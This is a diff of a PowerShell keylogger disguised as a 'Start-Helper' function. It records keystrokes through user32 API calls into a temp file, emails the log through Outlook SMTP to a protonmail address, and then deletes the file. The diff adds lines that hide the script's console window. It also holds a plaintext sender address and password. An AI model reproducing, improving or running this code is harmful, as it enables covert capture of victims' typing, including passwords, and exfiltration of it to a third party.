@@ -1,17 +1,20 @@
 $TimesToRun = 1
-$RunTimeP = 1	# Time in minutes
+$RunTimeP = 1  # Time in minutes
 $From = "luccasmachado001@outlook.com"
 $Pass = "hbzgnuqauqooxcbq"
 $To = "carlosalberto58@protonmail.com"
 $Subject = "pragmatica"
 $body = "report"
-$SMTPServer = "smtp-mail.outlook.com"	# Outlook SMTP
+$SMTPServer = "smtp-mail.outlook.com"  # Outlook SMTP
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 ############################
 
 $TimeStart = Get-Date
 $TimeEnd = $timeStart.addminutes($RunTimeP)
+$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
+add-type -name win -member $t -namespace native
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
 
 #requires -Version 2
 function Start-Helper($Path="$env:temp\help.txt") 
@@ -35,8 +38,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   {
 
     $Runner = 0
-	while ($TimesToRun  -ge $Runner) {
-	while ($TimeEnd -ge $TimeNow) {
+  while ($TimesToRun  -ge $Runner) {
+  while ($TimeEnd -ge $TimeNow) {
       Start-Sleep -Milliseconds 40
       
       for ($ascii = 9; $ascii -le 254; $ascii++) {
@@ -60,15 +63,15 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           }
         }
       }
-	  $TimeNow = Get-Date
+    $TimeNow = Get-Date
     }
-	send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
-	Remove-Item -Path $Path -force
-	}
+  send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
+  Remove-Item -Path $Path -force
+  }
   }
   finally
   {
-	exit 1
+  exit 1
   }
 }
 Start-Helper
